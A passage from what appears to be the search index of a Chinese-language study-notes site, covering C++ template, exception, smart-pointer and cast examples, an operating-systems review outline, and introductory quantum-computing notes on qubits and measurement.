<li>\u4ece\u6a21\u7248\u7c7b\u7ee7\u627f     <pre><code>template&lt;class T&gt;\nclass Derived : public Base&lt;T&gt; {};\n</code></pre>     \u8fd9\u91cc <code>Base</code> \u5728 <code>T</code> \u786e\u5b9a\u65f6\u5c31\u5df2\u7ecf\u662f\u4e00\u4e2a\u786e\u5b9a\u7684\u7c7b\u4e86\uff0c\u548c\u524d\u9762\u7684\u60c5\u51b5\u4e00\u6837</li> <li>\u975e\u6a21\u7248\u7c7b\u7ee7\u627f\u6a21\u7248\u7c7b     <pre><code>template&lt;class T&gt;\nclass Base {};\nclass Derived : public Base&lt;int&gt; {};\n</code></pre>     \u5fc5\u987b\u6307\u5b9a\u6a21\u7248\u53c2\u6570\u7c7b\u578b</li> <li> <p>CRTP \u6a21\u5f0f\uff08Curiously Recurring Template Pattern\uff09     <pre><code>template&lt;class T&gt;\nclass Base {\n    // ...\n};\nclass Derived : public Base&lt;Derived&gt; {\n    // ...\n};\n</code></pre></p> <p>\u6b64\u65f6 <code>Base</code> \u77e5\u9053 <code>T</code> \u4e00\u5b9a\u7ee7\u627f\u81ea <code>Base</code>\uff0c\u53ef\u4ee5\u5728 <code>Base</code> \u4e2d\u8c03\u7528 <code>T</code> \u7684\u6210\u5458\u51fd\u6570</p> </li> </ol> </li> </ul>"},{"location":"cs/oop/review/#iterators","title":"Iterators","text":"<ul> <li>\u5c01\u88c5\uff0c\u4f7f\u5f97\u5b9e\u73b0\u90e8\u5206\u77e5\u9053\u8fed\u4ee3\u5668\u6307\u5411\u5185\u5bb9\u7684\u7c7b\u578b     <pre><code>template&lt;class T, class U&gt;\nvoid foo_imp(T iter, U &amp;val) {\n    U tmp = *iter;\n    // ...\n}\ntemplate&lt;class T&gt;\nvoid foo(T iter) {\n    foo_imp(iter, *iter);\n}\n</code></pre></li> <li>Type info. definition:     <pre><code>template&lt;class T&gt;\nclass Iter {\npublic:\n    typedef T value_type;\n    // ...\n};\ntemplate &lt;class T&gt;\ntypename T::value_type func(T iter) {\n    return *iter;\n}\n\nIter&lt;int&gt; iter;\nfunc(iter);\n</code></pre></li> <li>iterator traits \u4ece\u8fed\u4ee3\u5668\u4e2d\u63d0\u53d6\u7c7b\u578b\u4fe1\u606f     <pre><code>template&lt;class Iter&gt;\nstruct iterator_traits {\n    typedef typename Iter::value_type value_type;\n};\ntemplate&lt;class T&gt;\ntypename iterator_traits&lt;T&gt;::value_type func(T iter) {\n    return *iter;\n}\n</code></pre></li> <li>template specialization \u6a21\u7248\u7279\u5316     <pre><code>template &lt;class T1, class T2, int N&gt;\nclass A {}; // primary template\ntemplate &lt;&gt;\nclass A&lt;int, int, 10&gt; {}; // full specialization\ntemplate &lt;class T&gt;\nclass A&lt;int, T, 10&gt; {}; // partial specialization\n\n// code\nA&lt;double, int, 0&gt; a; // primary template\nA&lt;int, int, 10&gt; a1; // full specialization\nA&lt;int, double, 10&gt; a2; // partial specialization\n</code></pre></li> <li>\u4f7f\u7528\u6a21\u7248\u7279\u5316\u5b9e\u73b0 <code>iterator_traits</code> <pre><code>template&lt;class T&gt;\nstruct iterator_traits {\n    typedef typename T::value_type value_type;\n    typedef typename T::pointer_type pointer_type;\n};\ntemplate&lt;class I&gt;\nstruct iterator_traits&lt;I*&gt; {\n    typedef I value_type;\n    typedef I* pointer_type;\n};\n\n// code\niterator_traits&lt;int*&gt;::value_type; // int\niterator_traits&lt;int*&gt;::pointer_type; // int*\n</code></pre></li> <li>iterator categories<ul> <li>InputIterator \u8f93\u5165\u8fed\u4ee3\u5668\uff0c\u80fd\u591f\u4ece\u8fed\u4ee3\u5668\u4e2d\u8bfb\u53d6\u5143\u7d20</li> <li>OutputIterator \u8f93\u51fa\u8fed\u4ee3\u5668\uff0c\u80fd\u591f\u5411\u8fed\u4ee3\u5668\u4e2d\u5199\u5165\u5143\u7d20</li> <li>ForwardIterator \u524d\u5411\u8fed\u4ee3\u5668</li> <li>BidirectionalIterator \u53cc\u5411\u8fed\u4ee3\u5668</li> <li>RandomAccessIterator \u968f\u673a\u8bbf\u95ee\u8fed\u4ee3\u5668</li> </ul> </li> </ul>"},{"location":"cs/oop/review/#exceptions","title":"Exceptions","text":"<ul> <li><code>throw</code> \u629b\u51fa\u5f02\u5e38\uff0c<code>catch</code> \u6355\u83b7\u5f02\u5e38     <pre><code>try {\n    // ...\n    throw exception(); // throw an exception (a class or other things)\n} catch (exception &amp;e) {\n    // ...\n    throw; // rethrow the same exception\n} catch (...) {\n    // catch all exceptions, must be the last catch block\n}\n</code></pre></li> <li>\u5339\u914d\u65b9\u5f0f\uff1a<ol> <li>\u5f02\u5e38\u7c7b\u578b\u5b8c\u5168\u5339\u914d</li> <li>\u53ef\u4ee5\u5411\u4e0a\u8f6c\u578b</li> <li><code>...</code> \u5339\u914d\u6240\u6709\u5f02\u5e38</li> <li>\u5426\u5219\u5411\u4e0a\u629b\u51fa</li> </ol> </li> <li><code>noexcept</code> \u627f\u8bfa\u4e0d\u629b\u51fa\u5f02\u5e38\uff0c\u5982\u679c\u629b\u51fa\u5f02\u5e38\uff0c\u7a0b\u5e8f\u4f1a\u8c03\u7528 <code>std::terminate</code> \u7ec8\u6b62\u7a0b\u5e8f     <pre><code>void foo() noexcept {\n    // ...\n}\n</code></pre></li> <li>\u5982\u679c\u6784\u9020\u51fd\u6570\u629b\u51fa\u5f02\u5e38\uff0c\u6790\u6784\u51fd\u6570\u4e0d\u4f1a\u88ab\u8c03\u7528\uff0c\u9700\u8981\u624b\u52a8\u91ca\u653e\u8d44\u6e90</li> <li>RAII\uff08Resource Acquisition Is Initialization\uff09\uff1a\u8d44\u6e90\u83b7\u53d6\u5373\u521d\u59cb\u5316\u3002     \u7528\u6808\u5bf9\u8c61\u7ba1\u7406\u5806\u8d44\u6e90\uff1a     <pre><code>class Wrapper {\nprivate:\n    int *vdata;\npublic:\n    Wrapper(int *vdata) : vdata(vdata) {}\n    ~Wrapper() { delete vdata; }\n};\nclass Data {\nprivate:\n    Wrapper w;\npublic:\n    Data() : w(new int[10]) {\n        // ...\n        throw exception(); // \u5982\u679c\u629b\u51fa\u5f02\u5e38\uff0cWrapper \u7684\u6790\u6784\u51fd\u6570\u4f1a\u88ab\u8c03\u7528\uff0c\u91ca\u653e\u8d44\u6e90\n    }\n    ~Data() {} // Wrapper \u7684\u6790\u6784\u51fd\u6570\u4f1a\u88ab\u8c03\u7528\uff0c\u91ca\u653e\u8d44\u6e90\n};\n</code></pre>     \u8fd9\u6837\u4e0d\u4f1a\u53d1\u751f\u6784\u9020\u51fd\u6570\u629b\u51fa\u5f02\u5e38\u65f6\u8d44\u6e90\u6cc4\u6f0f\u7684\u95ee\u9898\uff08\u53ef\u4ee5\u4f7f\u7528 <code>std::unique_ptr</code> \u4ee3\u66ff <code>Wrapper</code>\uff09</li> <li>\u5982\u679c\u6790\u6784\u51fd\u6570\u629b\u51fa\u5f02\u5e38\uff0c\u4f1a\u5bfc\u81f4\u6808\u63a8\u51fa\u65f6\u8c03\u7528\u81ea\u5df1\u7684\u6790\u6784\u51fd\u6570\uff0c\u6b64\u65f6\u7a0b\u5e8f\u4f1a\u8c03\u7528 <code>std::terminate</code> \u7ec8\u6b62\u7a0b\u5e8f</li> <li>\u4e00\u822c\u4f7f\u7528\u5f15\u7528 catch \u5f02\u5e38\uff0c\u907f\u514d\u62f7\u8d1d\u5f02\u5e38\u5bf9\u8c61\u6216\u8005\u5185\u5b58\u6cc4\u6f0f</li> </ul>"},{"location":"cs/oop/review/#smart-pointers","title":"Smart Pointers","text":"<ul> <li><code>unique_ptr</code> \u72ec\u5360\u6307\u9488\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u6307\u5411\u5bf9\u8c61\uff0c\u6790\u6784\u65f6\u91ca\u653e\u8d44\u6e90     <pre><code>std::unique_ptr&lt;T&gt; up = std::make_unique&lt;T&gt;(args);\nstd::unique_ptr&lt;T&gt; up(new T(args));\n</code></pre> <code>args</code> \u4e3a <code>T</code> \u7684\u6784\u9020\u51fd\u6570\u53c2\u6570\uff0c\u4f8b\u5982\uff1a     <pre><code>struct A {\n    A(int x, int y) {}\n};\nstd::unique_ptr&lt;A&gt; up = std::make_unique&lt;A&gt;(1, 2);\n</code></pre> <code>unique_ptr</code> \u4e0d\u80fd\u62f7\u8d1d\uff0c\u62f7\u8d1d\u8bed\u4e49\u5747\u88ab\u7981\u7528\uff0c\u53ea\u80fd\u79fb\u52a8\uff08\u4f7f\u7528 <code>std::move</code>\uff09     <pre><code>std::unique_ptr&lt;A&gt; up1 = std::make_unique&lt;A&gt;(1, 2);\nauto up2 = std::move(up1); // OK\nauto up3 = up1; // Error\nauto up3(up1); // Error\n</code></pre></li> <li><code>shared_ptr</code> \u5171\u4eab\u6307\u9488\uff0c\u5f15\u7528\u8ba1\u6570\uff0c\u6790\u6784\u65f6\u5f15\u7528\u8ba1\u6570\u51cf\u4e00\uff0c\u4e3a 0 \u65f6\u91ca\u653e\u8d44\u6e90     <pre><code>std::shared_ptr&lt;T&gt; sp = std::make_shared&lt;T&gt;(args);\n</code></pre> <code>shared_ptr</code> \u53ef\u4ee5\u62f7\u8d1d\uff0c\u5f15\u7528\u8ba1\u6570\u52a0\u4e00     <pre><code>std::shared_ptr&lt;A&gt; sp1 = std::make_shared&lt;A&gt;(1, 2);\nauto sp2 = sp1; // OK\n</code></pre> <code>shared_ptr::use_count()</code> \u8fd4\u56de\u5f15\u7528\u8ba1\u6570</li> <li><code>weak_ptr</code> \u5f31\u6307\u9488\uff0c\u4e0d\u589e\u52a0\u5f15\u7528\u8ba1\u6570\uff0c\u53ef\u4ee5\u7531 <code>shared_ptr</code> \u62f7\u8d1d\uff0c\u89e3\u51b3 <code>shared_ptr</code> \u5faa\u73af\u5f15\u7528\u95ee\u9898</li> <li><code>get()</code> \u8fd4\u56de\u539f\u59cb\u6307\u9488</li> <li> <p>UCPointer     </p> <ul> <li>UCObject \u57fa\u7c7b\uff0c\u5305\u542b\u5f15\u7528\u8ba1\u6570</li> <li>String Rep \u7ee7\u627f\u81ea UCObject\uff0c\u5305\u542b\u5b57\u7b26\u4e32\u6570\u636e</li> <li>UCPointer \u667a\u80fd\u6307\u9488\uff0c\u6a21\u7248\u7c7b\uff0c\u5305\u542b\u6307\u5411 UCObject \u7684\u6307\u9488</li> <li>String \u5305\u542b UCPointer\uff0c\u5b9e\u73b0\u5b57\u7b26\u4e32\u64cd\u4f5c</li> </ul> </li> </ul>"},{"location":"cs/oop/review/#misc-topics","title":"Misc Topics","text":""},{"location":"cs/oop/review/#named-casts","title":"Named Casts","text":"<ul> <li> <p><code>static_cast</code> </p> <pre><code>double d = 7.1;\nint i;\ni = d; // implicit conversion\ni = (int) d; // C-style cast, explicit conversion\ni = static_cast&lt;int&gt;(d); // static_cast, explicit conversion\n</code></pre> </li> <li> <p><code>reinterpret_cast</code></p> <pre><code>int a = 1;\ndouble *p;\np = (double *) &amp;a; // C-style cast\np = static_cast&lt;double *&gt;(&amp;a); // error\np = reinterpret_cast&lt;double *&gt;(&amp;a); // reinterpret_cast, but not safe\n</code></pre> </li> <li> <p><code>const_cast</code></p> <pre><code>const int a = 1;\nint *p;\np = *a; // error\np = (int *) &amp;a; // C-style cast\np = static_cast&lt;int *&gt;(&amp;a); // error\np = const_cast&lt;int *&gt;(&amp;a); // const_cast, remove const qualifier, but can't modify a\n</code></pre> </li> <li> <p><code>dynamic_cast</code> \u6839\u636e\u52a8\u6001\u7c7b\u578b\u8f6c\u6362\u6307\u9488\u6216\u5f15\u7528\uff0c\u9700\u8981\u57fa\u7c7b\u662f\u591a\u6001\u7c7b</p> <pre><code>struct A {\n    virtual void foo() {}\n};\nstruct B : A {};\nstruct C : A {};\nA *pa = new B;\nC *pc = static_cast&lt;C *&gt;(pa); // ok, but will fail if access things in C\nC *pc = dynamic_cast&lt;C *&gt;(pa); // ok, return nullptr if fail, runtime check\n</code></pre> </li> </ul>"},{"location":"cs/oop/review/#multiple-inheritance","title":"Multiple Inheritance","text":"<pre><code>class A {};\nclass B {};\nclass C : public A, public B {};\n</code></pre> <p>\u6b64\u65f6 <code>C</code> \u5305\u542b <code>A</code> \u548c <code>B</code> \u7684\u5b57\u6bb5\u3002</p> <ul> <li> <p>\u83f1\u5f62\u7ee7\u627f\uff1a     <pre><code>struct B1 { int mi; };\nstruct D1 : public B1 {};\nstruct D2 : public B1 {};\nstruct MI : public D1, public D2 {};\n\nM m; // OK\nB1 *pb = &amp;m; // Error, ambiguous mi\nB1 *pb = static_cast&lt;D1 *&gt;(&amp;m); // OK, use mi in D1\nB1 *pb = static_cast&lt;D2 *&gt;(&amp;m); // OK, use mi in D2\nm.D1::mi = 1; // OK\nm.D2::mi = 2; // OK\n</code></pre></p> </li> <li> <p>\u83f1\u5f62\u7ee7\u627f\u89e3\u51b3\u65b9\u6848</p> <ul> <li>\u57fa\u7c7b\u4e3a interface</li> <li>\u4f7f\u7528\u865a\u7ee7\u627f     <pre><code>struct B1 { int mi; };\nstruct D1 : virtual public B1 {};\nstruct D2 : virtual public B1 {};\nstruct MI : public D1, public D2 {};\n\nMI m;\nB1 *pb = &amp;m; // OK, only one mi\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/oop/review/#namespace","title":"Namespace","text":"<p>\u907f\u514d\u547d\u540d\u51b2\u7a81\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u540d\u7a7a\u95f4</p> <pre><code>namespace ns {\n    int x;\n    void foo() {}\n}\nns::x = 1;\nns::foo();\n</code></pre> <ul> <li> <p>alias namespace</p> <p><pre><code>namespace ns1_longname {\n    int x;\n    void foo() {}\n}\nnamespace ns2 = ns1_longname;\nns2::x = 1;\nns2::foo();\n</code></pre> - composition</p> <pre><code>namespace ns1 {}\nnamespace ns2 {}\nnamespace all {\n    using namespace ns1;\n    using namespace ns2;\n}\n</code></pre> </li> </ul>"},{"location":"cs/os/review/","title":"Review","text":"Review Lesson"},{"location":"cs/os/review/#computer-architecture","title":"Computer Architecture","text":""},{"location":"cs/os/review/#von-neumann-architecture","title":"Von Neumann Architecture","text":"<p>CPU, Memory, I/O devices</p>"},{"location":"cs/os/review/#os","title":"OS","text":"<p>mode bit:</p> <ul> <li>unprivileged mode: user mode</li> <li>privileged mode: kernel mode, run any instruction</li> </ul>"},{"location":"cs/os/review/#timer","title":"Timer","text":"<p>interrupt the computer regularly</p>"},{"location":"cs/os/review/#os-structure","title":"OS Structure","text":""},{"location":"cs/os/review/#system-calls","title":"System Calls","text":"<p>interface between user and kernel</p> <p>store and restore user context</p>"},{"location":"cs/os/review/#system-service","title":"System Service","text":"<p>Loader call syscall to setup library</p>"},{"location":"cs/os/review/#process","title":"Process","text":"<p>Process is resource and execution isolated unit.</p> <p>Thread is execution isolated unit.</p>"},{"location":"cs/os/review/#process-control-block-pcb","title":"Process Control Block (PCB)","text":"<p>store process information</p>"},{"location":"cs/os/review/#process-state","title":"Process State","text":"<p>Context Switch</p>"},{"location":"cs/os/review/#scheduling","title":"Scheduling","text":"<p>Gantt Chart:</p> <ul> <li>Average Waiting Time: Start Time - Arrival Time</li> <li>Average Turnaround Time: End Time - Arrival Time</li> </ul>"},{"location":"cs/os/review/#ipc","title":"IPC","text":"<ul> <li>Shared Memory</li> <li>Message Passing</li> </ul>"},{"location":"cs/os/review/#thread","title":"Thread","text":"<p>pc, sp, page table</p> <p>One-to-One Model: one thread to one kernel thread</p>"},{"location":"cs/os/review/#synchronization","title":"Synchronization","text":""},{"location":"cs/os/review/#petersons-algorithm","title":"Peterson's Algorithm","text":""},{"location":"cs/os/review/#hardware-instruction","title":"Hardware Instruction","text":"<ul> <li>test and set</li> <li>compare and swap</li> </ul>"},{"location":"cs/os/review/#mutex-lock","title":"Mutex Lock","text":""},{"location":"cs/os/review/#semaphore","title":"Semaphore","text":""},{"location":"cs/os/review/#examples","title":"Examples","text":"<ul> <li>Bounded Buffer Problem</li> </ul>"},{"location":"cs/os/review/#deadlock","title":"Deadlock","text":""},{"location":"cs/os/review/#memory-management","title":"Memory Management","text":""},{"location":"cs/os/review/#partition","title":"Partition","text":"<p>Base address, limit address</p> <ul> <li>Fixed Partition: internal fragmentation</li> <li>Variable Partition: external fragmentation</li> </ul>"},{"location":"cs/os/review/#segmentation","title":"Segmentation","text":"<p>multiple set of sections with same privilege</p> <p>Segment Table: Base and Limit</p>"},{"location":"cs/os/review/#paging","title":"Paging","text":"<ul> <li>page: virtual memory</li> <li>frame: physical memory</li> </ul> <p>Page Table: Physical Frame Number + Perms + Valid Bit</p>"},{"location":"cs/os/review/#virtual-memory","title":"Virtual Memory","text":""},{"location":"cs/os/review/#demand-paging","title":"Demand Paging","text":""},{"location":"cs/os/review/#copy-on-write","title":"Copy-on-Write","text":""},{"location":"cs/os/review/#page-replacement","title":"Page Replacement","text":""},{"location":"cs/os/review/#io-system","title":"IO System","text":""},{"location":"cs/os/review/#polling","title":"Polling","text":""},{"location":"cs/os/review/#interrupt","title":"Interrupt","text":""},{"location":"cs/os/review/#file-system","title":"File System","text":""},{"location":"cs/os/review/#file-control-block","title":"File Control Block","text":""},{"location":"cs/os/review/#virtual-file-system","title":"Virtual File System","text":"<p>Define common interface for different file system</p> <p>Directory Entry: Path to inode</p>"},{"location":"cs/os/review/#disk-block-allocation","title":"Disk Block Allocation","text":"<ul> <li>Contiguous Allocation</li> <li>Linked Allocation</li> <li>Indexed Allocation</li> </ul> <p>ext2: store index in inode (direct, indirect, double indirect, triple indirect)</p>"},{"location":"cs/quantum/chapter1/","title":"\u91cf\u5b50\u6bd4\u7279\u4e0e\u91cf\u5b50\u95e8","text":""},{"location":"cs/quantum/chapter1/#_2","title":"\u672f\u8bed\u5bf9\u7167","text":"\u91cf\u5b50\u672f\u8bed \u7ebf\u4ee3\u672f\u8bed \u6001\u77e2\u91cf\uff08State Vector\uff09 \u5411\u91cf\uff08Vector\uff09 \u672c\u5f81\u6001\uff08Eigenstate\uff09 \u7279\u5f81\u5411\u91cf\uff08Eigenvector\uff09 \u672c\u5f81\u503c\uff08Eigenvalue\uff09 \u7279\u5f81\u503c\uff08Eigenvalue\uff09 \u53f3\u77e2\uff08Ket\uff09\\( \\left\\lvert a \\right\\rangle \\) \u5217\u5411\u91cf \u5de6\u77e2\uff08Bra\uff09\\( \\left\\langle a \\right\\rvert \\) \u884c\u5411\u91cf \\( \\left\\langle a \\vert b \\right\\rangle \\) \u5411\u91cf\u5185\u79ef \\( \\left\\lvert a \\right\\rangle \\left\\langle b \\right\\rvert \\) \u5411\u91cf\u5916\u79ef \u57fa\u6001\uff08Ground State\uff09 \u6700\u5c0f\u672c\u5f81\u6001\uff08Eigenstate with the smallest Eigenvalue\uff09 \u7b97\u7b26\uff08Operator\uff09 \u77e9\u9635\uff08Matrix\uff09 \u7ebf\u6027\u7b97\u7b26\uff08Linear Operator\uff09 \u7ebf\u6027\u53d8\u6362\uff08Linear Transformation\uff09 \u5e7a\u6b63\uff08\u9149\uff09\u7b97\u7b26\uff08Unitary Operator\uff09\\(HH^{\\dagger} = I\\) \u6b63\u4ea4\u77e9\u9635\uff08Orthogonal Matrix\uff09 \u5384\u7c73\u77e9\u9635\uff08Hermitian Matrix\uff09\\(H = H^{\\dagger}\\) \u81ea\u4f34\u968f\u77e9\u9635\uff08Self-adjoint Matrix\uff09 \u7ebf\u6027\u53e0\u52a0\u539f\u7406\uff08Superposition Principle\uff09 \u7ebf\u6027\u7ec4\u5408\u6027\u8d28\uff08Linearity\uff09 \u6295\u5f71\u7b97\u7b26\uff08Projection Operator\uff09 \u6295\u5f71\u77e9\u9635\uff08Projection Matrix\uff09"},{"location":"cs/quantum/chapter1/#_3","title":"\u5355\u91cf\u5b50\u6bd4\u7279","text":""},{"location":"cs/quantum/chapter1/#divincenzo","title":"DiVincenzo \u5224\u636e","text":"<p>\u5224\u65ad\u4e00\u4e2a\u7269\u7406\u7cfb\u7edf\u662f\u5426\u9002\u5408\u7528\u4e8e\u91cf\u5b50\u8ba1\u7b97\u7684\u4e94\u4e2a\u6761\u4ef6\uff1a</p> <ol> <li>\u5177\u6709\u53ef\u63a7\u7684\u91cf\u5b50\u6bd4\u7279\uff0c\u5e76\u5177\u6709\u53ef\u6269\u5145\u6027\uff08\u53ef\u8c03\u63a7\u7684\u4e8c\u80fd\u7ea7\u7cfb\u7edf\uff09</li> <li>\u80fd\u591f\u521d\u59cb\u5316\u91cf\u5b50\u6bd4\u7279\u4e3a \\( \\left\\lvert 0 \\right\\rangle \\) \u6001\u6216 \\( \\left\\lvert 1 \\right\\rangle \\) \u6001</li> <li>\u5177\u6709\u957f\u76f8\u5173\u9000\u76f8\u5e72\u65f6\u95f4\uff0c\u786e\u4fdd\u6709\u5145\u8db3\u7684\u65f6\u95f4\u8fdb\u884c\u91cf\u5b50\u64cd\u4f5c</li> <li>\u6709\u4e00\u4e2a\u901a\u7528\u7684\u91cf\u5b50\u95e8\u96c6\u5408\uff0c\u80fd\u591f\u5bf9\u91cf\u5b50\u6bd4\u7279\u8fdb\u884c\u4efb\u610f\u5e7a\u6b63\u64cd\u4f5c</li> <li>\u80fd\u591f\u6d4b\u91cf\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001</li> </ol>"},{"location":"cs/quantum/chapter1/#_4","title":"\u91cf\u5b50\u6001","text":"<ul> <li>\u91cf\u5b50\u53e0\u52a0\u6001\uff1a\u91cf\u5b50\u6bd4\u7279\u53ef\u4ee5\u8868\u793a\u4e3a\u57fa\u6001\u7684\u7ebf\u6027\u7ec4\u5408\u3002</li> <li>\u91cf\u5b50\u7ea0\u7f20\uff1a\u4e00\u5bf9\u91cf\u5b50\u6bd4\u7279\u5bf9\u7684\u4e24\u4e2a\u91cf\u5b50\u6bd4\u7279\u5b58\u5728\u4e8e\u5355\u4e2a\u91cf\u5b50\u72b6\u6001\uff0c\u5f53\u4ee5\u53ef\u9884\u6d4b\u7684\u65b9\u5f0f\u6539\u53d8\u5176\u4e2d\u4e00\u4e2a\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001\u65f6\uff0c\u53e6\u4e00\u4e2a\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001\u5c06\u6539\u53d8\u3002</li> </ul>"},{"location":"cs/quantum/chapter1/#_5","title":"\u57fa\u77e2\u6001","text":"<p>\u4efb\u610f\u4e24\u4e2a\u5355\u4f4d\u6b63\u4ea4\u57fa\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u91cf\u5b50\u6001\u7684\u57fa\u77e2\u6001\u3002</p> <p>\u5e38\u7528\u7684\u6709\uff1a</p> <ul> <li>\\( \\left\\lvert 0 \\right\\rangle \\) \u548c \\( \\left\\lvert 1 \\right\\rangle \\)</li> <li> <p>\\( \\left\\lvert + \\right\\rangle \\) \u548c \\( \\left\\lvert - \\right\\rangle \\)</p> \\[     \\begin{aligned}         \\left\\lvert + \\right\\rangle &amp; = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle \\right) \\\\         \\left\\lvert - \\right\\rangle &amp; = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle \\right)     \\end{aligned} \\] </li> </ul> <p>\u4efb\u610f\u91cf\u5b50\u6001 \\( \\left\\lvert \\varphi \\right\\rangle \\) \u53ef\u4ee5\u8868\u793a\u4e3a\u57fa\u77e2\u6001\u7684\u7ebf\u6027\u7ec4\u5408\uff1a</p> \\[     \\left\\lvert \\varphi \\right\\rangle = \\alpha \\left\\lvert 0 \\right\\rangle + \\beta \\left\\lvert 1 \\right\\rangle \\] <p>\u5176\u4e2d \\( \\alpha \\) \u548c \\( \\beta \\) \u662f\u590d\u7cfb\u6570\uff08\u632f\u5e45\uff09\uff0c\u6ee1\u8db3 \\( \\left| \\alpha \\right|^2 + \\left| \\beta \\right|^2 = 1 \\)\u3002</p>"},{"location":"cs/quantum/chapter1/#_6","title":"\u91cf\u5b50\u6001\u77e2\u5185\u79ef","text":"<p>bra-ket \u8868\u793a\u6cd5\uff1abra \u8868\u793a\u884c\u5411\u91cf\uff0cket \u8868\u793a\u5217\u5411\u91cf\u3002</p> <p>\\( \\left\\langle \\varphi \\right\\lvert = \\left( \\alpha^*, \\beta^* \\right) \\) \u662f \\( \\left\\lvert \\varphi \\right\\rangle = \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} \\) \u7684\u5171\u8f6d\u8f6c\u7f6e\u3002</p> <p>\u5185\u79ef\u5b9a\u4e49\uff1a</p> \\[     \\left\\langle a \\vert b \\right\\rangle = a_1^* b_1 + a_2^* b_2 + \\cdots + a_n^* b_n \\] <p>\u82e5\u4e24\u5411\u91cf\u5185\u79ef\u4e3a 0\uff0c\u5219\u4e24\u5411\u91cf\u6b63\u4ea4\u3002</p> <p>\u5b9a\u4e49\u91cf\u5b50\u6001\u7684\u6b27\u51e0\u91cc\u5f97\u8303\u6570\u4e3a \\( \\left\\lVert \\left\\lvert \\varphi \\right\\rangle \\right\\rVert = \\sqrt{\\left\\langle \\varphi \\vert \\varphi \\right\\rangle} \\)\u3002</p>"},{"location":"cs/quantum/chapter1/#_7","title":"\u91cf\u5b50\u6001\u7684\u574d\u7f29","text":"<p>\u5f53\u5bf9\u91cf\u5b50\u6001\u8fdb\u884c\u6d4b\u91cf\u65f6\uff0c\u91cf\u5b50\u6001\u4f1a\u574d\u7f29\u5230\u6d4b\u91cf\u7ed3\u679c\u5bf9\u5e94\u7684\u672c\u5f81\u6001\u4e0a\u3002</p> <p>\u6d4b\u91cf \\( \\left\\lvert \\varphi \\right\\rangle = \\alpha \\left\\lvert 0 \\right\\rangle + \\beta \\left\\lvert 1 \\right\\rangle \\)\uff0c\u6709\u6982\u7387 \\( \\left| \\alpha \\right|^2 \\) \u5f97\u5230 \\( \\left\\lvert 0 \\right\\rangle \\)\uff0c\u6982\u7387 \\( \\left| \\beta \\right|^2 \\) \u5f97\u5230 \\( \\left\\lvert 1 \\right\\rangle \\)\u3002</p> <p>\u5f52\u4e00\u5316\u6761\u4ef6\uff1a\\( \\left| \\alpha \\right|^2 + \\left| \\beta \\right|^2 = 1 \\)\u3002</p> <p>\u4e0d\u53ef\u514b\u9686\u539f\u7406</p> <p>\u91cf\u5b50\u6001\u7684\u574d\u7f29\u5bfc\u81f4\u91cf\u5b50\u6001\u7684\u4e0d\u53ef\u514b\u9686\uff0c\u5373\u4e0d\u53ef\u80fd\u590d\u5236\u4e00\u4e2a\u672a\u77e5\u7684\u91cf\u5b50\u6001\u3002</p> <p>\u4e0d\u5b58\u5728\u4e00\u4e2a\u7ebf\u6027\u7b97\u7b26 \\( U \\) \u80fd\u591f\u5c06 \\( \\left\\lvert \\varphi \\right\\rangle \\left\\lvert 0 \\right\\rangle \\) \u6620\u5c04\u5230 \\( \\left\\lvert \\varphi \\right\\rangle \\left\\lvert \\varphi \\right\\rangle \\)\u3002</p>"},{"location":"cs/quantum/chapter1/#_8","title":"\u91cf\u5b50\u6bd4\u7279\u7684\u51e0\u4f55\u8868\u793a","text":"<p>\u53ef\u4ee5\u5c06\u5355\u91cf\u5b50\u6bd4\u7279\u7684\u91cf\u5b50\u6001\u53ef\u89c6\u5316\u5728\u4e00\u4e2a\u7403\u9762\u4e2d\uff0c\u8fd9\u4e2a\u7403\u9762\u79f0\u4e3a Bloch \u7403\u3002</p> <p>\u5c06\u91cf\u5b50\u6001\u5199\u6210 \\( \\left\\lvert \\varphi \\right\\rangle = \\cos \\frac{\\theta}{2} \\left\\lvert 0 \\right\\rangle + e^{i \\phi} \\sin \\frac{\\theta}{2} \\left\\lvert 1 \\right\\rangle \\)\uff0c\u5176\u4e2d \\( \\theta \\) \u548c \\( \\phi \\) \u662f\u6781\u89d2\uff0c\u53ef\u4ee5\u8868\u793a\u5728\u7403\u9762\u4e0a\u7684\u70b9\u3002</p> <p>Bloch \u7403\u53ea\u80fd\u53ef\u89c6\u5316\u5355\u4e2a\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001\u3002</p>"},{"location":"cs/quantum/chapter1/#_9","title":"\u591a\u91cf\u5b50\u6bd4\u7279","text":""},{"location":"cs/quantum/chapter1/#_10","title":"\u591a\u91cf\u5b50\u6bd4\u7279\u7684\u8868\u793a","text":"<p>n \u91cf\u5b50\u6bd4\u7279\u53ef\u4ee5\u8868\u793a\u4e3a \\( 2^n \\) \u7ef4\u590d\u5411\u91cf\u7a7a\u95f4\u4e2d\u7684\u4e00\u4e2a\u5411\u91cf\u3002\u4ee5\u4e24\u91cf\u5b50\u6bd4\u7279\u4e3a\u4f8b\uff1a</p> \\[     \\left\\lvert \\varphi \\right\\rangle = \\alpha_{00} \\left\\lvert 00 \\right\\rangle + \\alpha_{01} \\left\\lvert 01 \\right\\rangle + \\alpha_{10} \\left\\lvert 10 \\right\\rangle + \\alpha_{11} \\left\\lvert 11 \\right\\rangle \\] <p>\u5176\u4e2d \\( \\alpha_{ij} \\) \u662f\u590d\u7cfb\u6570\uff0c\u6ee1\u8db3\u5f52\u4e00\u5316\u6761\u4ef6\u3002</p> <p>\u5982\u679c\u8fdb\u884c\u6d4b\u91cf\uff0c\u4e24\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001\u4f1a\u574d\u7f29\u5230\u6d4b\u91cf\u7ed3\u679c\u5bf9\u5e94\u7684\u672c\u5f81\u6001\u4e0a\u3002</p> <p>\u5982\u679c\u4ec5\u6d4b\u91cf\u4f4e\u4f4d\u91cf\u5b50\u6bd4\u7279\uff0c\u5219\u6709 \\( \\left\\lvert \\alpha_{00} \\right\\rvert^2 + \\left\\lvert \\alpha_{01} \\right\\rvert^2 \\) 